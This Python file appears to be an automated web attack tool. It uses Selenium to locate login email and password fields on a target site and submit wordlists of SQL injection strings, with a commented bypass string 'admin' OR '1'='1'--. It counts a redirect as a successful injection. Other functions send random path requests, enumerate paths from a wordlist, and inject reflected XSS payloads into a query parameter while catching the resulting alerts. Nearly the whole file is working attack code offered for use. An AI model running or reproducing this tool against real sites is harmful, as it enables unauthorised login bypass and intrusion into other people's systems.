import os
import sys
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException
from bs4 import BeautifulSoup
from modules.mods import *
import requests
import string 
import random
import json
from colorama import *

box_width = 49

# Function to create a fixed-width line bc it line wraps sometimes
def create_box_line(content, width, align="left"):
    if align == "left":
        return f"⟪ {content.ljust(width - 4)} ⟫"
    elif align == "right":
        return f"⟪ {content.rjust(width - 4)} ⟫"
    elif align == "center":
        return f"⟪ {content.center(width - 4)} ⟫"

def generate_random_string(length=8):
    # Define the characters to choose from: letters (uppercase and lowercase) and digits
    characters = string.ascii_letters + string.digits
    # Generate a random string by selecting random characters from the defined set
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def inject(url, driver, response, wordlist, payload, delay):

    # Initialize lists to store the actual WebElement objects
    email_elements = []
    password_elements = []
    # injection queue
    num = 0
    # Get the URL from the webdriver
    driver.get(url)
    
    

    try:
        # # Find elements by ID and NAME for password inputs
         # Open the file and read each line into a list
        with open("data/PassSelectors.txt", 'r') as f:
            selectors = [line.strip() for line in f.readlines()]

        # Loop through selectors and attempt to find elements
        # selector list is in data/PassSelectors.txt
        for selector in selectors:
            try:
                # Check if it's an XPATH expression
                if selector.startswith('//*[@'):
                    elements = driver.find_elements(By.XPATH, selector)
                else:
                    elements = driver.find_elements(By.NAME, selector)
                    elements = driver.find_elements(By.ID, selector)

                if elements:
                    password_elements.extend(elements)
                
            except Exception as e:
                print(f"Error finding elements for selector {selector}: {e}")
            # Remove duplicates by converting to a set and then back to a list
        password_elements = list(set(password_elements))

    except Exception as e:
            print(f"An error occurred: {e}")

    try:
        # same as code above but for emails ^
        with open("data/EmailSelectors.txt", 'r') as f:
                Eselectors = [line.strip() for line in f.readlines()]

        # Loop through selectors and attempt to find elements
        # selector list is in data/PassSelectors.txt
        for selector in Eselectors:
            try:
                # Check if it's an XPATH expression
                if selector.startswith('//*[@'):
                    elements = driver.find_elements(By.XPATH, selector)
                else:
                    elements = driver.find_elements(By.NAME, selector)
                    elements = driver.find_elements(By.ID, selector)

                if elements:
                    email_elements.extend(elements)
                
            except Exception as e:
                print(f"Error finding elements for selector {selector}: {e}")
            # Remove duplicates by converting to a set and then back to a list
        email_elements = list(set(email_elements))
    except Exception as e:
        print(f"An error occurred: {e}")

    # Count the elements
    pwd = len(password_elements)
    count = len(email_elements)


    # Call the logo function
    logo(url, response, count, pwd)
    # reading and deciding the payloads
    if payload == 1 or payload == 0:
      if payload == 0:
            print(f"⟪ {Fore.RED + "Using Defualt Wordlist" + Fore.RESET}                        ⟫")
            print("⟪                                               ⟫")
      with open('dict/sql-common.txt', 'r') as file:
    # Read all lines and add them to a list
          lines = file.readlines()

    if payload == 2:
      with open('dict/sql-generic.txt', 'r') as f:
          lines = f.readlines()

    if payload == 3:
      with open('dict/sql-time.txt', 'r') as f:
          lines = f.readlines()
    


    email_credentials = [line.strip() for line in lines]

    # email_credentials = ["admin' OR '1'='1'--", "user@example.com"]
    password_credentials = ["parrot"]
    
    print(f"⟪ Injections Loaded: {len(email_credentials)}                         ⟫")
    print("⟪                                               ⟫")
    print("⟪ Injection Queue:                              ⟫")
    print("⟪                                               ⟫")
    for email in email_credentials:
        for password in password_credentials:
            try:
                # Send keys to the email elements
                
                for element in email_elements:
                    element.clear()
                    element.send_keys(email)
                    
                    print(create_box_line(f"  {num}.  {email}", box_width, "left"))
                    num += 1
                

                # Send keys to the password elements
                for element in password_elements:
                    element.clear()
                    element.send_keys(password)
                    
                
                # Press Enter after filling out the forms
                password_elements[0].send_keys(Keys.RETURN)

            except Exception as e:
                pass
                
    
    # Wait for the page to potentially redirect
    # Check if the URL has changed (indicating a redirect)
    current_url = driver.current_url
    
    if current_url != url:
        print("⟪                                               ⟫")
        print("⟪===============================================⟫ ")
        print("⟪                                               ⟫")
        print(f"⟪ Redirection:                                  ⟫")
        print("⟪                                               ⟫")
        print(f"⟪ {current_url}           ⟫")
        if current_url != "": 
            print("⟪                                               ⟫")
            print(create_box_line(f"Injection: {Fore.GREEN + 'Successful' + Fore.RESET}", 59, "left"))
            save_to_json(url, num)
            print("⟪                                               ⟫")
        else:
            print(create_box_line(f"Injection: {Fore.RED + 'Failure :(' + Fore.RESET}", 49, "left"))           
    # Keep the browser open for 10 seconds before closing
    time.sleep(10)
    

def brute(url,driver,response):
    print("⟪===============================================⟫")
    print("⟪                                               ⟫")
    print("⟪ Bruting:                                      ⟫")
    print("⟪                                               ⟫")
    i = 0
    while i <= 32:
        rq = requests.get(url + generate_random_string(4))
        print(f"⟪ {i}. {url + generate_random_string(4)}: {rq.status_code}     ⟫")
        i += 1
    
def subdomain(url, driver, wordlist):
    
    driver.get(url)
    homecode = driver.page_source.strip()  # Strip whitespace from homepage code
    
    print("Home Page Source Captured.")
    
    with open(wordlist, 'r') as f:
        lines = f.readlines()
        
    for line in lines:
        line = line.strip()  # Strip whitespace from each line
        if not line:  # Skip empty lines
            continue
            
        newurl = url + "/" + line
        
        try:
            driver.get(newurl)
            domaincode = driver.page_source.strip()  # Strip whitespace from domain code
            print("⟪                                               ⟫")
            if homecode == domaincode:
                pass
            else:
                print(create_box_line(f"{newurl}", 49, "left"))
                
        except Exception as e:
            print(f"Error accessing {newurl}: {e}")

# Function to handle alerts and continue
def handle_alert(driver):
    try:
        # Switch to the alert and accept it
        alert = driver.switch_to.alert
        print("⟪                                               ⟫")
        print("⟪===============================================⟫")
        print("⟪                                               ⟫")
        print(f"⟪ Alert detected: {alert.text}                             ⟫")
        print("⟪                                               ⟫")
        alert.accept()
    except NoAlertPresentException:
        # No alert to handle
        pass

def xssScan(driver, url,mode=1):

    if mode == 1:
     input_elements = []
     print("⟪===============================================⟫")
     print("⟪                                               ⟫")
     print("⟪ Scanning For XSS In URL:                      ⟫")
     print("⟪                                               ⟫")
     
     with open('dict/xss-common.txt', 'r') as f:
           xss_payloads = f.readlines()
     
     param_name = "q"
     for payload in xss_payloads:
         # Construct the vulnerable URL by injecting payload into the parameter
         vulnerable_url = f"{url}{param_name}={payload}"
         
         
         # Open the URL in the browser
         print(create_box_line(f"{param_name}={payload.strip('\n')}", 49, "left"))
         try:
             driver.get(vulnerable_url)
             time.sleep(2)  # Wait for the page to load
             
             # Handle any unexpected alerts
             handle_alert(driver)
             
             # Check if the payload is reflected in the page source
             page_source = driver.page_source
             if payload in page_source:
                 print(00)
             else:
                 pass
         
         except UnexpectedAlertPresentException:
             # Handle the alert if it interrupts the execution
           handle_alert(driver)
        
        